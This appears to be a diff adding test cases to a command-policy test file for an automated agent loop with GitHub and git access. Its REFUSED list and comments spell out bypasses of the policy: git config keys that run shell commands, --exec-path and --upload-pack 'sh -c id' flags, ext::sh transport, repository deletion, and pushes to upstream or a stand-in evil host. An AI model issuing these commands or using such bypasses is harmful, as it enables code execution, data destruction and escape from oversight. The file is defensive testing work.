@@ -125,6 +125,21 @@ REFUSED = [
     (["gh", "variable", "set", "X"], "selfimprove.no-merge-or-approve"),
     (["gh", "workflow", "run", "deploy.yml"], "selfimprove.no-merge-or-approve"),
     (["gh", "ruleset", "list"], "selfimprove.no-merge-or-approve"),
+    # The allow-list admits `repo` and `issue` as bare nouns so the loop can
+    # confirm its fork and check for prior art. Both are read-only errands, and
+    # for a while nothing looked at the verb underneath them -- so the noun that
+    # bought a `gh repo view` also bought `gh repo delete`.
+    (["gh", "repo", "delete", "o/r"], "selfimprove.gh-repo-reads-only"),
+    (["gh", "repo", "edit", "--visibility", "public"], "selfimprove.gh-repo-reads-only"),
+    (["gh", "repo", "archive", "o/r"], "selfimprove.gh-repo-reads-only"),
+    (["gh", "repo", "rename", "pwned"], "selfimprove.gh-repo-reads-only"),
+    (["gh", "repo", "deploy-key", "add", "k.pub"], "selfimprove.gh-repo-reads-only"),
+    (["gh", "--repo", "o/r", "repo", "delete"], "selfimprove.gh-repo-reads-only"),
+    (["gh", "issue", "close", "42"], "selfimprove.gh-issue-reads-only"),
+    (["gh", "issue", "delete", "42"], "selfimprove.gh-issue-reads-only"),
+    (["gh", "issue", "edit", "42", "--body", "x"], "selfimprove.gh-issue-reads-only"),
+    (["gh", "issue", "transfer", "42", "o/r"], "selfimprove.gh-issue-reads-only"),
+    (["gh", "issue", "comment", "42", "--body", "x"], "selfimprove.gh-issue-reads-only"),
     # An alias is a second name for a command the rules above already refused,
     # and gh resolves it before dispatch, so the argv a rule sees is `gh t`.
     # Worse than a one-turn bypass: the alias is written to gh's config under
@@ -147,6 +162,12 @@ REFUSED = [
     (["gh", "-R", "o/r", "t"], "selfimprove.unlisted-gh-subcommand"),
     (["gh", "--repo", "o/r", "t"], "selfimprove.unlisted-gh-subcommand"),
     (["gh", "--repo=o/r", "t"], "selfimprove.unlisted-gh-subcommand"),
+    # A short flag's value may be attached to it, which is one argv token with
+    # neither a space nor an `=` in it. That form went past both arms at once:
+    # the `-R` arm wanted a separator and the bare arm's `(?!-)` stopped on the
+    # dash, so `gh -Ro/r label delete x` reached gh with nothing having read it.
+    (["gh", "-Ro/r", "t"], "selfimprove.unlisted-gh-subcommand"),
+    (["gh", "-Rowner/repo", "label", "delete", "x"], "selfimprove.unlisted-gh-subcommand"),
     # git executes `alias.*`, `core.pager`, `core.hooksPath` and
     # `credential.helper` values that begin `!` as shell commands, so a config
     # assignment is arbitrary execution wearing a flag -- including a route
@@ -158,6 +179,40 @@ REFUSED = [
     (["git", "-c", "credential.helper=!sh -c 'x'", "fetch"], "selfimprove.no-git-config-injection"),
     (["git", "--config-env=alias.z=EVIL", "z"], "selfimprove.no-git-config-injection"),
     (["git", "config", "--global", "alias.z", "!sh"], "selfimprove.no-git-config-injection"),
+    # git's three-part keys put a URL in the middle, and a URL is not a word --
+    # so a key pattern built from dot-separated `[A-Za-z0-9_-]+` cannot express
+    # one, and these two were policy-clean. The first installs a credential
+    # helper that is a shell command; the second rewrites every github.com URL.
+    (["git", "-c", "credential.https://github.com.helper=!sh", "fetch", "origin"], "selfimprove.no-git-config-injection"),
+    (["git", "--config-env=url.https://evil/.insteadOf=EVIL", "fetch", "origin"], "selfimprove.no-git-config-injection"),
+    # The loop's one write. `fork` is the remote the runner creates and the only
+    # one the filing skill is told to push to; every other spelling reaches a
+    # repository this loop does not own, and `origin` in upstream mode is
+    # gke-labs/kube-agents itself.
+    (["git", "push"], "selfimprove.git-push-fork-only"),
+    (["git", "push", "origin", "HEAD:main"], "selfimprove.git-push-fork-only"),
+    (["git", "push", "--force", "origin", "main"], "selfimprove.git-push-fork-only"),
+    (["git", "push", "https://github.com/gke-labs/kube-agents", "HEAD:main"], "selfimprove.git-push-fork-only"),
+    (["git", "-C", "/src", "push", "origin", "main"], "selfimprove.git-push-fork-only"),
+    (["git", "send-pack", "https://evil.example/r", "HEAD"], "selfimprove.git-push-fork-only"),
+    # ...and re-pointing the name the rule above trusts.
+    (["git", "remote", "set-url", "fork", "https://github.com/gke-labs/kube-agents.git"], "selfimprove.no-git-remote-repoint"),
+    (["git", "remote", "rename", "origin", "fork"], "selfimprove.no-git-remote-repoint"),
+    (["git", "remote", "remove", "fork"], "selfimprove.no-git-remote-repoint"),
+    (["git", "remote", "rm", "fork"], "selfimprove.no-git-remote-repoint"),
+    # Flags that hand git a program to run, in the container that mounts the
+    # PAT. None is a mutating subcommand, so the proxy's `.lease` floor does not
+    # see them either, and the filing turn can write the directory
+    # `--exec-path` would point at.
+    (["git", "--exec-path=/home/selfimprove/x", "pwn"], "selfimprove.no-git-exec-flags"),
+    (["git", "--exec-path", "/home/selfimprove/x", "pwn"], "selfimprove.no-git-exec-flags"),
+    (["git", "-C", "/src", "--exec-path=/tmp/x", "status"], "selfimprove.no-git-exec-flags"),
+    (["git", "ls-remote", '--upload-pack=sh -c "id"', "."], "selfimprove.no-git-exec-flags"),
+    (["git", "clone", "--upload-pack", "sh -c id", ".", "d"], "selfimprove.no-git-exec-flags"),
+    (["git", "ls-remote", "-u", "sh -c id", "."], "selfimprove.no-git-exec-flags"),
+    (["git", "fetch", "--receive-pack=sh -c id", "origin"], "selfimprove.no-git-exec-flags"),
+    (["git", "rebase", "--exec", "sh -c id", "main"], "selfimprove.no-git-exec-flags"),
+    (["git", "ls-remote", "ext::sh -c id"], "selfimprove.no-git-exec-flags"),
 ]
 
 # `shlex.join` writes an argument containing an apostrophe as a mixture of both
@@ -233,6 +288,14 @@ PERMITTED = [
     ["gh", "search", "issues", "--repo", "gke-labs/kube-agents", "reconciler retry"],
     ["gh", "issue", "view", "42", "--json", "state,closedAt"],
     ["gh", "repo", "view", "--json", "defaultBranchRef"],
+    # The read verbs the allow-list exists for, including with the repository
+    # named ahead of the subcommand -- the flag-skip in the lookahead has to
+    # reach past `-R o/r` to find `view` and past `--json` to not care.
+    ["gh", "repo", "view", "gke-labs/kube-agents", "--json", "viewerPermission"],
+    ["gh", "repo", "list", "kube-agent-robot"],
+    ["gh", "-R", "gke-labs/kube-agents", "repo", "view"],
+    ["gh", "issue", "list", "--search", "close the handle", "--state", "open"],
+    ["gh", "issue", "status"],
     # `git switch -c <branch>` is the filing turn's first write and shares its
     # flag spelling with `git -c <key>=<value>`. The config rule separates them
     # on the dotted-key-with-a-value, so a branch name may not be enough to
@@ -244,6 +307,24 @@ PERMITTED = [
     ["git", "remote", "add", "fork", "https://github.com/o/r.git"],
     ["git", "show", "-s", "--format=%cI", "HEAD"],
     ["git", "-C", "/home/selfimprove/src/repo", "status"],
+    # The four calls `_fetch_source_git` makes, and the push the filing skill
+    # makes, none of which the push/remote/exec rules may reach. The flag-skip
+    # in the push rule sits inside one negative lookahead rather than beside it:
+    # written as `\s+push(?:\s+-\S+)*(?!\s+fork)` the engine backtracks the
+    # flag-skip to zero and refuses the one push the loop is built around.
+    ["git", "init", "--quiet"],
+    ["git", "remote", "add", "origin", "https://github.com/gke-labs/kube-agents.git"],
+    ["git", "push", "fork", "HEAD:selfimprove/errors-retry-loop"],
+    ["git", "push", "--set-upstream", "fork", "HEAD"],
+    ["git", "push", "-u", "--porcelain", "fork", "HEAD"],
+    ["git", "-C", "/src", "push", "-u", "fork", "HEAD"],
+    ["git", "remote", "-v"],
+    ["git", "log", "--oneline", "-n", "5"],
+    # A branch name is not a config key, and `-C` is `-c` to a rule compiled
+    # with re.IGNORECASE -- both share their spelling with the injection rule.
+    ["git", "switch", "-c", "selfimprove/forge-remote-set-url"],
+    ["git", "switch", "-c", "selfimprove/fix-v1.2-push"],
+    ["git", "-C", "/home/selfimprove/src/kube-agents.git/x", "status"],
 ]
 
 
